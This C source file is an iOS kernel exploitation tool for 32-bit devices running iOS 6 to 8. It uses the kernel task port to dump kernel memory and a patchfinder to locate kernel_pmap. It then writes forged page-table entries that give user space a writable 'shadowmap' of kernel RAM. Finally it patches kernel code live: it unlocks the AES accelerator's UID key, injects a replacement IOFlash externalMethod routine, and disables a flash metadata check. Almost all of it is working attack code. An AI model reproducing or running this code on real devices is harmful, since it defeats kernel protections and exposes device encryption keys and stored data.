/*
 * Shadowmapping, a way of bypassing iOS 'kernel page bits protection'. 
 * (ARM32 only for now obviously.)
 *
 * Also a very nice and easy way of copying data in and out of kernel memory
 * by breaking the barrier entirely. Thank you TTBCR and split TTBR0/TTBR1!<3
 *
 * Control flow goes like this if you have a write anywhere exploit:
 *
 *  - Find location of kernel_pmap (dereference to get kernel_pmap_store.)
 *  - Get virtual address of TTE base (struct is as follows... 
 *    typedef struct __pmap_t {
 *        uint32_t    tte_virt;
 *        uint32_t    tte_phys;
 *        .....
 *    } pmap_t;
 *
 *  - Write TTE entries.
 *  - Own the kernel.
 *  - ???
 *  - PROFIT.
 *
 * with love from @winocm, greets to @planetbeing for patchfinder.
 *
 * Optimally, this would be best done with a write/read kernel exploit primitive set,
 * however, you can do this with a write-only one if you use static offsets (which will work,
 * as the kernel isn't randomized in physical memory space.)
 */

#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <sys/types.h>
#include <sys/sysctl.h>
#include <mach/machine.h>
#include <mach/mach.h>
#include "ioflash/externalMethod.h"
#include <CoreFoundation/CoreFoundation.h>

/*
 * ARM page bits for L1 sections.
 */
#define L1_SHIFT            20            /* log2(1MB) */

#define L1_SECT_PROTO        (1 << 1)        /* 0b10 */

#define L1_SECT_B_BIT        (1 << 2)
#define L1_SECT_C_BIT        (1 << 3)

#define L1_SECT_SORDER       (0)            /* 0b00, not cacheable, strongly ordered. */
#define L1_SECT_SH_DEVICE    (L1_SECT_B_BIT)
#define L1_SECT_WT_NWA       (L1_SECT_C_BIT)
#define L1_SECT_WB_NWA       (L1_SECT_B_BIT | L1_SECT_C_BIT)
#define L1_SECT_S_BIT        (1 << 16)

#define L1_SECT_AP_URW       (1 << 10) | (1 << 11)
#define L1_SECT_PFN(x)       (x & 0xFFF00000)

#define L1_SECT_DEFPROT      (L1_SECT_AP_URW)
#define L1_SECT_DEFCACHE     (L1_SECT_SORDER)

#define L1_PROTO_TTE(paddr)  (L1_SECT_PFN(paddr) | L1_SECT_S_BIT | L1_SECT_DEFPROT | L1_SECT_DEFCACHE | L1_SECT_PROTO)

#define PFN_SHIFT            2
#define TTB_OFFSET(vaddr)    ((vaddr >> L1_SHIFT) << PFN_SHIFT)

/*
 * RAM physical base begin. 
 */
#define S5L8930_PHYS_OFF    0x40000000
#define S5L8940_PHYS_OFF    0x80000000        /* Note: RAM base is identical for 8940-8955. */

//#define PHYS_OFF            S5L8930_PHYS_OFF

/*
 * Shadowmap begin and end. 15MB of shadowmap is enough for the kernel.
 * We don't need to invalidate unified D/I TLB or any cache lines
 * since the kernel is mapped as writethrough memory, and these
 * addresses are guaranteed to not be translated.
 * (Accesses will cause segmentation faults due to failure on L1 translation.)
 *
 * Clear the shadowmappings when done owning the kernel.
 *
 * 0x7ff0'0000 is also below the limit for vm_read and such, so that's also *great*.
 * (2048 bytes)
 */
#define SHADOWMAP_BEGIN          0x7f000000
#define SHADOWMAP_END            0x7ff00000
#define SHADOWMAP_GRANULARITY    0x00100000

#define SHADOWMAP_SIZE_BYTES    (SHADOWMAP_END - SHADOWMAP_BEGIN)

#define SHADOWMAP_BEGIN_OFF     TTB_OFFSET(SHADOWMAP_BEGIN)
#define SHADOWMAP_END_OFF       TTB_OFFSET(SHADOWMAP_END)
#define SHADOWMAP_SIZE          (SHADOWMAP_END_OFF - SHADOWMAP_BEGIN_OFF)

#define SHADOWMAP_BEGIN_IDX     (SHADOWMAP_BEGIN_OFF >> PFN_SHIFT)
#define SHADOWMAP_END_IDX       (SHADOWMAP_END_OFF >> PFN_SHIFT)

#define TTB_SIZE                4096
#define DEFAULT_KERNEL_SLIDE    0x80000000

static mach_port_t kernel_task = 0;
static uint32_t ttb_template[TTB_SIZE] = {};
static void* ttb_template_ptr = &ttb_template[0];
static vm_address_t kernel_base = DEFAULT_KERNEL_SLIDE;

typedef struct pmap_partial_t {
    uint32_t tte_virt;
    uint32_t tte_phys;
    /* ... */
} pmap_partial_t;

/* --- planetbeing patchfinder --- */

static uint32_t bit_range(uint32_t x, int start, int end)
{
    x = (x << (31 - start)) >> (31 - start);
    x = (x >> end);
    return x;
}

static uint32_t ror(uint32_t x, int places)
{
    return (x >> places) | (x << (32 - places));
}

static int thumb_expand_imm_c(uint16_t imm12)
{
    if(bit_range(imm12, 11, 10) == 0)
    {
        switch(bit_range(imm12, 9, 8))
        {
            case 0:
                return bit_range(imm12, 7, 0);
            case 1:
                return (bit_range(imm12, 7, 0) << 16) | bit_range(imm12, 7, 0);
            case 2:
                return (bit_range(imm12, 7, 0) << 24) | (bit_range(imm12, 7, 0) << 8);
            case 3:
                return (bit_range(imm12, 7, 0) << 24) | (bit_range(imm12, 7, 0) << 16) | (bit_range(imm12, 7, 0) << 8) | bit_range(imm12, 7, 0);
            default:
                return 0;
        }
    } else
    {
        uint32_t unrotated_value = 0x80 | bit_range(imm12, 6, 0);
        return ror(unrotated_value, bit_range(imm12, 11, 7));
    }
}

static int insn_is_32bit(uint16_t* i)
{
    return (*i & 0xe000) == 0xe000 && (*i & 0x1800) != 0x0;
}

static int insn_is_bl(uint16_t* i)
{
    if((*i & 0xf800) == 0xf000 && (*(i + 1) & 0xd000) == 0xd000)
        return 1;
    else if((*i & 0xf800) == 0xf000 && (*(i + 1) & 0xd001) == 0xc000)
        return 1;
    else
        return 0;
}

static uint32_t insn_bl_imm32(uint16_t* i)
{
    uint16_t insn0 = *i;
    uint16_t insn1 = *(i + 1);
    uint32_t s = (insn0 >> 10) & 1;
    uint32_t j1 = (insn1 >> 13) & 1;
    uint32_t j2 = (insn1 >> 11) & 1;
    uint32_t i1 = ~(j1 ^ s) & 1;
    uint32_t i2 = ~(j2 ^ s) & 1;
    uint32_t imm10 = insn0 & 0x3ff;
    uint32_t imm11 = insn1 & 0x7ff;
    uint32_t imm32 = (imm11 << 1) | (imm10 << 12) | (i2 << 22) | (i1 << 23) | (s ? 0xff000000 : 0);
    return imm32;
}

static int insn_is_b_conditional(uint16_t* i)
{
    return (*i & 0xF000) == 0xD000 && (*i & 0x0F00) != 0x0F00 && (*i & 0x0F00) != 0xE;
}

static int insn_is_b_unconditional(uint16_t* i)
{
    if((*i & 0xF800) == 0xE000)
        return 1;
    else if((*i & 0xF800) == 0xF000 && (*(i + 1) & 0xD000) == 9)
        return 1;
    else
        return 0;
}

static int insn_is_ldr_literal(uint16_t* i)
{
    return (*i & 0xF800) == 0x4800 || (*i & 0xFF7F) == 0xF85F;
}

static int insn_ldr_literal_rt(uint16_t* i)
{
    if((*i & 0xF800) == 0x4800)
        return (*i >> 8) & 7;
    else if((*i & 0xFF7F) == 0xF85F)
        return (*(i + 1) >> 12) & 0xF;
    else
        return 0;
}

static int insn_ldr_literal_imm(uint16_t* i)
{
    if((*i & 0xF800) == 0x4800)
        return (*i & 0xF) << 2;
    else if((*i & 0xFF7F) == 0xF85F)
        return (*(i + 1) & 0xFFF) * (((*i & 0x0800) == 0x0800) ? 1 : -1);
    else
        return 0;
}

// TODO: More encodings

static int insn_ldr_imm_rt(uint16_t* i)
{
    return (*i & 7);
}

static int insn_ldr_imm_rn(uint16_t* i)
{
    return ((*i >> 3) & 7);
}

static int insn_ldr_imm_imm(uint16_t* i)
{
    return ((*i >> 6) & 0x1F);
}

int insn_ldr_reg_rt(uint16_t* i)
{
    if((*i & 0xFE00) == 0x5800)
        return *i & 0x7;
    else if((*i & 0xFFF0) == 0xF850 && (*(i + 1) & 0x0FC0) == 0x0000)
        return (*(i + 1) >> 12) & 0xF;
    else
        return 0;
}

int insn_ldr_reg_rm(uint16_t* i)
{
    if((*i & 0xFE00) == 0x5800)
        return (*i >> 6) & 0x7;
    else if((*i & 0xFFF0) == 0xF850 && (*(i + 1) & 0x0FC0) == 0x0000)
        return *(i + 1) & 0xF;
    else
        return 0;
}


static int insn_is_add_reg(uint16_t* i)
{
    if((*i & 0xFE00) == 0x1800)
        return 1;
    else if((*i & 0xFF00) == 0x4400)
        return 1;
    else if((*i & 0xFFE0) == 0xEB00)
        return 1;
    else
        return 0;
}

static int insn_add_reg_rd(uint16_t* i)
{
    if((*i & 0xFE00) == 0x1800)
        return (*i & 7);
    else if((*i & 0xFF00) == 0x4400)
        return (*i & 7) | ((*i & 0x80) >> 4) ;
    else if((*i & 0xFFE0) == 0xEB00)
        return (*(i + 1) >> 8) & 0xF;
    else
        return 0;
}

static int insn_add_reg_rn(uint16_t* i)
{
    if((*i & 0xFE00) == 0x1800)
        return ((*i >> 3) & 7);
    else if((*i & 0xFF00) == 0x4400)
        return (*i & 7) | ((*i & 0x80) >> 4) ;
    else if((*i & 0xFFE0) == 0xEB00)
        return (*i & 0xF);
    else
        return 0;
}

static int insn_add_reg_rm(uint16_t* i)
{
    if((*i & 0xFE00) == 0x1800)
        return (*i >> 6) & 7;
    else if((*i & 0xFF00) == 0x4400)
        return (*i >> 3) & 0xF;
    else if((*i & 0xFFE0) == 0xEB00)
        return *(i + 1) & 0xF;
    else
        return 0;
}

static int insn_is_movt(uint16_t* i)
{
    return (*i & 0xFBF0) == 0xF2C0 && (*(i + 1) & 0x8000) == 0;
}

static int insn_movt_rd(uint16_t* i)
{
    return (*(i + 1) >> 8) & 0xF;
}

static int insn_movt_imm(uint16_t* i)
{
    return ((*i & 0xF) << 12) | ((*i & 0x0400) << 1) | ((*(i + 1) & 0x7000) >> 4) | (*(i + 1) & 0xFF);
}

static int insn_is_mov_imm(uint16_t* i)
{
    if((*i & 0xF800) == 0x2000)
        return 1;
    else if((*i & 0xFBEF) == 0xF04F && (*(i + 1) & 0x8000) == 0)
        return 1;
    else if((*i & 0xFBF0) == 0xF240 && (*(i + 1) & 0x8000) == 0)
        return 1;
    else
        return 0;
}

static int insn_mov_imm_rd(uint16_t* i)
{
    if((*i & 0xF800) == 0x2000)
        return (*i >> 8) & 7;
    else if((*i & 0xFBEF) == 0xF04F && (*(i + 1) & 0x8000) == 0)
        return (*(i + 1) >> 8) & 0xF;
    else if((*i & 0xFBF0) == 0xF240 && (*(i + 1) & 0x8000) == 0)
        return (*(i + 1) >> 8) & 0xF;
    else
        return 0;
}

static int insn_mov_imm_imm(uint16_t* i)
{
    if((*i & 0xF800) == 0x2000)
        return *i & 0xF;
    else if((*i & 0xFBEF) == 0xF04F && (*(i + 1) & 0x8000) == 0)
        return thumb_expand_imm_c(((*i & 0x0400) << 1) | ((*(i + 1) & 0x7000) >> 4) | (*(i + 1) & 0xFF));
    else if((*i & 0xFBF0) == 0xF240 && (*(i + 1) & 0x8000) == 0)
        return ((*i & 0xF) << 12) | ((*i & 0x0400) << 1) | ((*(i + 1) & 0x7000) >> 4) | (*(i + 1) & 0xFF);
    else
        return 0;
}

// Given an instruction, search backwards until an instruction is found matching the specified criterion.
static uint16_t* find_last_insn_matching(uint32_t region, uint8_t* kdata, size_t ksize, uint16_t* current_instruction, int (*match_func)(uint16_t*))
{
    while((uintptr_t)current_instruction > (uintptr_t)kdata)
    {
        if(insn_is_32bit(current_instruction - 2) && !insn_is_32bit(current_instruction - 3))
        {
            current_instruction -= 2;
        } else
        {
            --current_instruction;
        }

        if(match_func(current_instruction))
        {
            return current_instruction;
        }
    }

    return NULL;
}

// Given an instruction and a register, find the PC-relative address that was stored inside the register by the time the instruction was reached.
static uint32_t find_pc_rel_value(uint32_t region, uint8_t* kdata, size_t ksize, uint16_t* insn, int reg)
{
    // Find the last instruction that completely wiped out this register
    int found = 0;
    uint16_t* current_instruction = insn;
    while((uintptr_t)current_instruction > (uintptr_t)kdata)
    {
        if(insn_is_32bit(current_instruction - 2))
        {
            current_instruction -= 2;
        } else
        {
            --current_instruction;
        }

        if(insn_is_mov_imm(current_instruction) && insn_mov_imm_rd(current_instruction) == reg)
        {
            found = 1;
            break;
        }

        if(insn_is_ldr_literal(current_instruction) && insn_ldr_literal_rt(current_instruction) == reg)
        {
            found = 1;
            break;
        }
    }

    if(!found)
        return 0;

    // Step through instructions, executing them as a virtual machine, only caring about instructions that affect the target register and are commonly used for PC-relative addressing.
    uint32_t value = 0;
    while((uintptr_t)current_instruction < (uintptr_t)insn)
    {
        if(insn_is_mov_imm(current_instruction) && insn_mov_imm_rd(current_instruction) == reg)
        {
            value = insn_mov_imm_imm(current_instruction);
        } else if(insn_is_ldr_literal(current_instruction) && insn_ldr_literal_rt(current_instruction) == reg)
        {
            value = *(uint32_t*)(kdata + (((((uintptr_t)current_instruction - (uintptr_t)kdata) + 4) & 0xFFFFFFFC) + insn_ldr_literal_imm(current_instruction)));
        } else if(insn_is_movt(current_instruction) && insn_movt_rd(current_instruction) == reg)
        {
            value |= insn_movt_imm(current_instruction) << 16;
        } else if(insn_is_add_reg(current_instruction) && insn_add_reg_rd(current_instruction) == reg)
        {
            if(insn_add_reg_rm(current_instruction) != 15 || insn_add_reg_rn(current_instruction) != reg)
            {
                // Can't handle this kind of operation!
                return 0;
            }

            value += ((uintptr_t)current_instruction - (uintptr_t)kdata) + 4;
        }

        current_instruction += insn_is_32bit(current_instruction) ? 2 : 1;
    }

    return value;
}

// Find PC-relative references to a certain address (relative to kdata). This is basically a virtual machine that only cares about instructions used in PC-relative addressing, so no branches, etc.
static uint16_t* find_literal_ref(uint32_t region, uint8_t* kdata, size_t ksize, uint16_t* insn, uint32_t address)
{
    uint16_t* current_instruction = insn;
    uint32_t value[16];
    memset(value, 0, sizeof(value));

    while((uintptr_t)current_instruction < (uintptr_t)(kdata + ksize))
    {
        if(insn_is_mov_imm(current_instruction))
        {
            value[insn_mov_imm_rd(current_instruction)] = insn_mov_imm_imm(current_instruction);
        } else if(insn_is_ldr_literal(current_instruction))
        {
            uintptr_t literal_address  = (uintptr_t)kdata + ((((uintptr_t)current_instruction - (uintptr_t)kdata) + 4) & 0xFFFFFFFC) + insn_ldr_literal_imm(current_instruction);
            if(literal_address >= (uintptr_t)kdata && (literal_address + 4) <= ((uintptr_t)kdata + ksize))
            {
                value[insn_ldr_literal_rt(current_instruction)] = *(uint32_t*)(literal_address);
            }
        } else if(insn_is_movt(current_instruction))
        {
            value[insn_movt_rd(current_instruction)] |= insn_movt_imm(current_instruction) << 16;
        } else if(insn_is_add_reg(current_instruction))
        {
            int reg = insn_add_reg_rd(current_instruction);
            if(insn_add_reg_rm(current_instruction) == 15 && insn_add_reg_rn(current_instruction) == reg)
            {
                value[reg] += ((uintptr_t)current_instruction - (uintptr_t)kdata) + 4;
                if(value[reg] == address)
                {
                    return current_instruction;
                }
            }
        }

        current_instruction += insn_is_32bit(current_instruction) ? 2 : 1;
    }

    return NULL;
}

// This points to kernel_pmap. Use that to change the page tables if necessary.
uint32_t find_pmap_location(uint32_t region, uint8_t* kdata, size_t ksize)
{
    // Find location of the pmap_map_bd string.
    uint8_t* pmap_map_bd = memmem(kdata, ksize, "\"pmap_map_bd\"", sizeof("\"pmap_map_bd\""));
    if(!pmap_map_bd)
        return 0;

    // Find a reference to the pmap_map_bd string. That function also references kernel_pmap
    uint16_t* ptr = find_literal_ref(region, kdata, ksize, (uint16_t*) kdata, (uintptr_t)pmap_map_bd - (uintptr_t)kdata);
    if(!ptr)
        return 0;

    printf("pmap_map_bd xref at %p\n", ptr);
    //hax for iOS 8, panic("\"pmap_map_bd\"") call is located *after* the end of function so go back a bit
    ptr -= 0x10;

    // Find the end of it.
    const uint8_t search_function_end[] = {0xF0, 0xBD};//   POP {R4-R7,PC}
    ptr = memmem(ptr, ksize - ((uintptr_t)ptr - (uintptr_t)kdata), search_function_end, sizeof(search_function_end));
    if(!ptr)
        return 0;

    // Find the last BL before the end of it. The third argument to it should be kernel_pmap
    uint16_t* bl = find_last_insn_matching(region, kdata, ksize, ptr, insn_is_bl);
    if(!bl)
        return 0;

    // Find the last LDR R2, [R*] before it that's before any branches. If there are branches, then we have a version of the function that assumes kernel_pmap instead of being passed it.
    uint16_t* ldr_r2 = NULL;
    uint16_t* current_instruction = bl;
    while((uintptr_t)current_instruction > (uintptr_t)kdata)
    {
        if(insn_is_32bit(current_instruction - 2) && !insn_is_32bit(current_instruction - 3))
        {
            current_instruction -= 2;
        } else
        {
            --current_instruction;
        }

        if(insn_ldr_imm_rt(current_instruction) == 2 && insn_ldr_imm_imm(current_instruction) == 0)
        {
            ldr_r2 = current_instruction;
            break;
        } else if(insn_is_b_conditional(current_instruction) || insn_is_b_unconditional(current_instruction))
        {
            break;
        }
    }

    // The function has a third argument, which must be kernel_pmap. Find out its address
    if(ldr_r2)
        return find_pc_rel_value(region, kdata, ksize, ldr_r2, insn_ldr_imm_rn(ldr_r2));

    // The function has no third argument, Follow the BL.
    uint32_t imm32 = insn_bl_imm32(bl);
    uint32_t target = ((uintptr_t)bl - (uintptr_t)kdata) + 4 + imm32;
    if(target > ksize)
        return 0;

    // Find the first PC-relative reference in this function.
    int found = 0;

    int rd;
    current_instruction = (uint16_t*)(kdata + target);
    while((uintptr_t)current_instruction < (uintptr_t)(kdata + ksize))
    {
        if(insn_is_add_reg(current_instruction) && insn_add_reg_rm(current_instruction) == 15)
        {
            found = 1;
            rd = insn_add_reg_rd(current_instruction);
            current_instruction += insn_is_32bit(current_instruction) ? 2 : 1;
            break;
        }

        current_instruction += insn_is_32bit(current_instruction) ? 2 : 1;
    }

    if(!found)
        return 0;

    return find_pc_rel_value(region, kdata, ksize, current_instruction, rd);
}

/* --- planetbeing patchfinder --- */

//from https://github.com/saelo/ios-kern-utils/blob/master/lib/kernel/base.c
vm_address_t get_kernel_base()
{
    kern_return_t ret;
    task_t kernel_task;
    vm_region_submap_info_data_64_t info;
    vm_size_t size;
    mach_msg_type_number_t info_count = VM_REGION_SUBMAP_INFO_COUNT_64;
    unsigned int depth = 0;
    vm_address_t addr = 0x81200000;
    //arm64
    //addr = 0xffffff8000000000;

    ret = task_for_pid(mach_task_self(), 0, &kernel_task);
    if (ret != KERN_SUCCESS)
    {
        printf("task_for_pid(0) returned=%x\n", ret);
        return -1;
    }

    while (1) {
        ret = vm_region_recurse_64(kernel_task, &addr, &size, &depth, (vm_region_info_t) & info, &info_count);
        //printf("addr=0x%llx\n", addr);
        if (ret != KERN_SUCCESS)
            break;
        if (size > 1024 * 1024 * 1024)
            return addr;
        addr += size;
    }

    return -1;
}

static void generate_ttb_entries(uint32_t ram_base)
{
    uint32_t vaddr, vaddr_end, paddr, i;

    paddr = ram_base;
    vaddr = SHADOWMAP_BEGIN;
    vaddr_end = SHADOWMAP_END;

    for(i = vaddr; i <= vaddr_end; i += SHADOWMAP_GRANULARITY, paddr += SHADOWMAP_GRANULARITY) {
        printf("ProtoTTE: 0x%08x for VA 0x%08x -> PA 0x%08x\n", L1_PROTO_TTE(paddr), i, paddr);
        ttb_template[TTB_OFFSET(i) >> PFN_SHIFT] = L1_PROTO_TTE(paddr);
    }

    printf("TTE offset begin for shadowmap: 0x%08x\n"
           "TTE offset end for shadowmap:   0x%08x\n"
           "TTE size:                       0x%08x\n",
           SHADOWMAP_BEGIN_OFF, SHADOWMAP_END_OFF, SHADOWMAP_SIZE);

    return;
}

#define DMPSIZE            0xF00000
void do_kernel_patchs();

CF_EXPORT const CFStringRef _kCFSystemVersionProductVersionKey;
CF_EXPORT CFDictionaryRef _CFCopySystemVersionDictionary(void);

int check_ios_version()
{
    //http://stackoverflow.com/questions/20104403/determine-if-ios-device-is-32-or-64-bit
    size_t size;
    cpu_type_t type;

    size = sizeof(type);
    sysctlbyname("hw.cputype", &type, &size, NULL, 0);

    if(type != CPU_TYPE_ARM)
    {
        printf("Only 32 bit devices are supported !\n");
        return 0;
    }
    CFStringRef version = NULL;
    CFDictionaryRef versionDict = _CFCopySystemVersionDictionary();

    if(versionDict == NULL)
        return 0;
    version = CFDictionaryGetValue(versionDict, _kCFSystemVersionProductVersionKey);

    if(version == NULL)
        return 0;

    CFArrayRef arr = CFStringCreateArrayBySeparatingStrings(kCFAllocatorDefault, version, CFSTR("."));

    if(arr == NULL)
        return 0;

    SInt32 major = CFStringGetIntValue(CFArrayGetValueAtIndex(arr, 0));

    printf("iOS major version: %ld\n", major);

    if(major != 8 && major != 7 && major != 6)
    {
        printf("Unsupported iOS version !\n");
        return 0;
    }

    return 1;
}

int main(int argc, char* argv[])
{
    uint32_t chunksize = 2048;

    if(!check_ios_version())
    {
        return 0;
    }

    printf("calling get_kernel_base\n");
    /* get kernel base. */
    kernel_base = get_kernel_base();
    if(kernel_base == -1) {
        printf("failed to get kernel base...\n");
        return -1;
    }
    kernel_base += 0x1000;

    printf("kernel_base=%p\n", (void*) kernel_base);

    /* we can now find the kernel pmap. */
    kern_return_t r = task_for_pid(mach_task_self(), 0, &kernel_task);
    if(r != 0)
    {
        printf("task_for_pid fail\n");
        return -1;
    }

    //hax, sometimes on iOS7 kernel starts at +0x200000 in the 1Gb region
    pointer_t buf;
    mach_msg_type_number_t sz = 0x500;

    kernel_base += 0x200000;
    vm_read(kernel_task, kernel_base, chunksize, &buf, &sz);
    printf("@ %p => %x\n", (void*) kernel_base, *((uint32_t*)buf));
    if(*((uint32_t*)buf) != 0xfeedface)
    {
        kernel_base -= 0x200000;
        vm_read(kernel_task, kernel_base, chunksize, &buf, &sz);
        printf("@ %p => %x\n", (void*) kernel_base, *((uint32_t*)buf));
        if(*((uint32_t*)buf) != 0xfeedface)
        {
            printf("Failed to find feedface at kernelbase +0/0x200000\n");
            return 0;
        }
    }

    /* kill */
    vm_address_t addr = kernel_base + 0x1000, e = 0;
    uint8_t* p = malloc(DMPSIZE + 0x1000);
    if(!p) {
        printf("failed to malloc memory for kernel dump...\n");
        return -1;
    }

    while(addr < (kernel_base + DMPSIZE))
    {
        vm_read(kernel_task, addr, chunksize, &buf, &sz);
        if(!buf || sz == 0)
            continue;
        uint8_t* z = (uint8_t*) buf;
        addr += chunksize;
        bcopy(z, p + e, chunksize);
        e += chunksize;
    }
    /*printf("writing kernel to kdump.bin\n");
    FILE *fp = fopen("kdump.bin", "wb");
    fwrite((void*)p, DMPSIZE, 1, fp);
    fclose(fp);
    return 0;*/


    /* kernel dumped, now find pmap. */
    uint32_t kernel_pmap = kernel_base + 0x1000 + find_pmap_location(kernel_base, (uint8_t*)p, DMPSIZE);
    printf("kernel pmap is at 0x%08x\n", kernel_pmap);
    //TODO add more sanity checks

    /* Read for kernel_pmap, dereference it for pmap_store. */
    vm_read(kernel_task, kernel_pmap, 2048, &buf, &sz);
    vm_address_t pmap_store = *(vm_address_t*)(buf);
    printf("pmap_store= %p\n", (void*) pmap_store);
    if(!pmap_store)
    {
        return 0;
    }
    vm_read(kernel_task, pmap_store, 2048, &buf, &sz);

    /* 
     * We now have the struct. Let's copy it out to get the TTE base (we don't really need to do this
     * as it should just remain constant. TTEs should be after ToKD.)
     */
    pmap_partial_t* part = (pmap_partial_t*)buf;
    uint32_t tte_virt = part->tte_virt;
    uint32_t tte_phys = part->tte_phys;

    printf("kernel pmap tte base is at VA 0x%08x PA 0x%08x\n", tte_virt, tte_phys);

    uint32_t ram_base = tte_phys & 0xF0000000;//hax
    printf("ram base 0x%08x\n", ram_base);
    /* generate TTEs. */
    generate_ttb_entries(ram_base);

    /* Now, we can start reading at the TTE base and start writing in the descriptors. */
    uint32_t tte_off = SHADOWMAP_BEGIN_OFF;
    vm_read(kernel_task, tte_virt + tte_off, 2048, &buf, &sz);
    bcopy((char*)ttb_template_ptr + tte_off, (void*)buf, SHADOWMAP_SIZE);
    vm_write(kernel_task, tte_virt + tte_off, buf, sz);

    /* Haxx done, write out the kernel. :) */
    //printf("done writing descriptors, dumping the kernel via shadow mapping now\n");

    //sleep(2);//hax, need to flush caches ?
    do_kernel_patchs();

    return 0;
}

void do_kernel_patchs()
{
/**
com.apple.iokit.IOCryptoAcceleratorFamily:__text:8094BD48 B0 F5 FA 6F                 CMPNE.W         R0, #0x7D0
com.apple.iokit.IOCryptoAcceleratorFamily:__text:8094BD4C 00 F0 A2 80                 BEQ.W           loc_8094BE94
=> B0 F5 FA 6F 00 F0 A2 80
**/
    uint8_t* ptr = (uint8_t*) SHADOWMAP_BEGIN;
    uint8_t* iomem = 0x0, *addr=0;

    while(ptr < ((uint8_t*)SHADOWMAP_END))
    {
        if(!memcmp(ptr, "\xB0\xF5\xFA\x6F\x00\xF0\xA2\x80", 8)//ios7
         || !memcmp(ptr, "\xB0\xF5\xFA\x6F\x00\xF0\x92\x80", 8)//ios6
         || !memcmp(ptr, "\xB0\xF5\xFA\x6F\x00\xF0\x82\x80", 8))//ios8
        {
            printf("Patching IOSAESAccelerator enable uid key !\n");
            ptr += 4;
            *((uint32_t*) ptr) = 0x460c460c;
        }
        //if(!memcmp(ptr, "\xF0\xB5\x03\xAF\x4D\xF8\x04\x8D\x8B\xB0\x15\x46\x40\xF2\xC2\x26", 16))
        //IOFlashControllerUserClient::externalMethod
        if(!memcmp(ptr, "\xF0\xB5\x03\xAF\x4D\xF8\x04\x8D\x8B\xB0\x15\x46", 12)
         ||!memcmp(ptr, "\xF0\xB5\x03\xAF\x4D\xF8\x04\x8D\x8B\xB0\x16\x46", 12))//ios8
        {
            addr = (ptr - SHADOWMAP_BEGIN) + kernel_base  - 0x1000;
            printf("Found ioFlash at %p\n", addr);
            if(!iomem)
            {
                printf("But missing IOMemoryDescriptor::withAddress !\n");
            }
            else
            {
                iomem = (uint8_t*) -(addr + 2 + 0xC - (iomem + 1));
                printf("delta = %p\n", iomem);
                memcpy(ptr, externalMethod_bin, externalMethod_bin_len);
                memcpy(ptr + externalMethod_bin_len, &iomem, 4);
            }
        }
        if(!memcmp(ptr, "\xF0\xB5\x03\xAF\x2D\xE9\x00\x0D\x81\xB0\x06\x46\x64\x20\x9B\x46", 16))
        {
            if(iomem == 0)
            {
                iomem = (ptr - SHADOWMAP_BEGIN) + kernel_base - 0x1000;
                printf("Found IOMemoryDescriptor::withAddress at %p\n", iomem);
            }
        }
        //meta fringe
        if(!memcmp(ptr, "\xF0\xB5\x03\xAF\x81\xB0\x1C\x46\x15\x46\x0E\x46\xB5\x42", 14)
         ||!memcmp(ptr, "\xF0\xB5\x03\xAF\x81\xB0\x1C\x46\x15\x46\x0E\x46\xAE\x42", 14))//ios8
        {
            printf("Found AppleIOPFMI::_fmiPatchMetaFringe\n");
            *((uint32_t*) ptr) = 0x47704770;
        }
        ptr += 2;
    }

}
